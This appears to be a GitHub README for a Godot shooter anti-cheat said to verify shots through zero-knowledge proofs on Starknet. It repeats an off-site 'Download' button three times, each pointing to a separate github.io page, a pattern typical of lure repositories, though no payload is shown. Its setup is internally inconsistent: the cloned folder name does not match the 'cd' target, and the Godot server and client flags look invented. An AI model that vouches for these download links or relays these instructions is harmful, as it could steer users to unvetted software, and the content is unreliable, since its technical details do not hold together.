# ZK-Sniper / Obsidian Anti-Cheat - Anti-Cheat 2026

> **A first-person shooter anti-cheat built around non-invasive zero-knowledge checks on Starknet, swapping kernel-level monitoring for on-chain physics validation while keeping player privacy intact.**

[![Platform](https://img.shields.io/badge/Platform-Godot-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/dylanio1990/starknet-anti-cheat-hub?style=flat-square)](https://github.com/dylanio1990/starknet-anti-cheat-hub)

---

<p align="center">
  <a href="https://dylanio1990.github.io/starknet-anti-cheat-hub/">
    <img src="https://img.shields.io/badge/Download-ZK--Sniper%20Latest-brightgreen?style=for-the-badge" alt="Download ZK-Sniper">
  </a>
</p>

> **[Download ZK-Sniper / Obsidian Anti-Cheat v1.0](https://dylanio1990.github.io/starknet-anti-cheat-hub/)**

---

[Download Latest Build](https://dylanio1990.github.io/starknet-anti-cheat-hub/)

---

## Overview

ZK-Sniper / Obsidian Anti-Cheat takes a different path from conventional game security by pushing cheat validation to the blockchain. Rather than relying on kernel hooks or intrusive system surveillance, the project checks player behavior through zero-knowledge proofs on Starknet. Its "Proof of Shot" mechanism is designed to catch aimbots and wallhacks without exposing private player information.

This approach is aimed at developers and competitive players who want fair matches without surrendering system privacy. The stack uses Cairo smart contracts together with the Torii indexer to verify events efficiently on-chain. Because the design avoids elevated privileges, the anti-cheat can run alongside the game in user space, which makes it a practical fit for Godot-based FPS projects that need transparent, trustless integrity checks.

## Features

- **User-space operation** - No kernel access is needed, and the system stays out of privileged components
- **On-chain physics checks** - Game actions are validated against physical rules on Starknet
- **Privacy-preserving proofs** - Zero-knowledge verification confirms actions without revealing personal data
- **Cairo smart contracts** - Dedicated contracts manage proof creation and verification behavior
- **Torii indexer integration** - Game events can be indexed and queried efficiently from chain data
- **Aimbot and wallhack detection** - Flags implausible aim movement and shots through blocked geometry
- **Proof of Shot logic** - Verifies whether a shot is physically plausible from player position and weapon stats
- **Godot engine compatible** - Built to integrate with Godot-based FPS titles

## Installation

Clone the repository, then switch into the project directory:

```bash
git clone https://github.com/dylanio1990/starknet-anti-cheat-hub.git
cd ZK-Anti-Cheat
```

There are no extra build steps for the Godot project itself. Open the project in Godot Engine and run the main scene. For Cairo contract deployment, refer to the instructions under `contracts/`.

## Usage

1. Start the game from Godot Engine.
2. The anti-cheat comes online automatically when the game launches.
3. Player actions are checked against on-chain physics constraints.
4. If behavior looks suspicious, the system sends a proof request to Starknet.
5. Valid actions continue normally, while invalid ones are marked.

Example workflow:

```bash
# Start the game server
godot --server

# Connect a client
godot --client --address 127.0.0.1 --port 8080
```

## Configuration

Configuration lives in `config/anti_cheat_settings.json`. Important options include:

```json
{
  "proof_threshold": 0.95,
  "verification_timeout_ms": 2000,
  "starknet_rpc_url": "https://starknet-goerli.infura.io/v3/YOUR_KEY",
  "torii_endpoint": "https://torii.example.com/graphql"
}
```

Tune these values to change verification sensitivity and network behavior.

## Requirements

- **Platform:** Godot Engine 4.x or later
- **Runtime:** Goerli or Sepolia Starknet testnet (mainnet for production)
- **Storage:** ~50 MB for game assets and contract ABIs
- **Network:** Internet connection for on-chain verification
- **Dependencies:** Cairo compiler v2.0+ for contract deployment

## FAQ

**Q: What sets this apart from standard anti-cheat systems?**  
A: It relies on zero-knowledge proofs on Starknet instead of kernel-level inspection, so privacy is preserved while cheats are still detected.

**Q: Will this hurt game performance?**  
A: The impact is minimal. Verification runs asynchronously and only kicks in when behavior appears suspicious.

**Q: Can the verification thresholds be changed?**  
A: Yes. Update the `proof_threshold` value in the configuration file.

**Q: How are the Cairo contracts updated?**  
A: Rebuild them with the newest Cairo release and deploy them again to Starknet.

**Q: Where can I get help?**  
A: Open a GitHub issue for bugs or feature requests.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
